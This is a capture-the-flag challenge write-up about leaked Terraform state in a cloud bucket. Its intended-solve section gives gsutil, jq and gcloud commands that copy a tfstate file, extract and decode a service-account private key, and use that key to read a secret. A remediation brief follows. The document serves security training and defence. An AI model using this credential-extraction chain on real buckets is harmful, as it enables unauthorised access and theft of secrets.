# h05 — State of Affairs (LankaGov)

**Category:** Cloud / Terraform state leak · **Difficulty:** Hard · **Points:** 400 (dynamic)

## Intended solve
```sh
# A CI/CD bucket was left readable and still holds a Terraform state file.
gsutil ls gs://<ci-bucket>/                                  # terraform.tfstate
gsutil cp gs://<ci-bucket>/terraform.tfstate .

# tfstate stores resource attributes in the clear — including a service-account key that a
# module wrote as a resource. Extract and decode it:
jq -r '.resources[] | select(.type=="google_service_account_key") | .instances[].attributes.private_key' \
  terraform.tfstate | base64 -d > sa-key.json

# Activate it and follow its ONE scoped grant to the flag:
gcloud auth activate-service-account --key-file=sa-key.json
gcloud secrets versions access latest --secret=lankagov-registry-flag   # CYPHER{...}
#   (or a single BigQuery cell the SA can read)
```

## Infra & safety
- Public/mis-shared CI bucket containing a real `terraform.tfstate` whose `private_key` decodes to
  a **least-privilege** SA key (only `secretAccessor` on one secret / one BQ cell).
- **Shared** challenge, **per-team unique flag**. The leaked key reaches exactly one resource,
  never project admin — the IAM healthcheck asserts the scope limit.

## Remediation (Blue Team Brief)
Never expose state buckets; store Terraform state in a private backend with encryption + locking;
treat state as secret material (it contains keys/passwords in plaintext); rotate any credential
that touches state; prefer keyless auth (Workload Identity Federation) over exported SA keys.
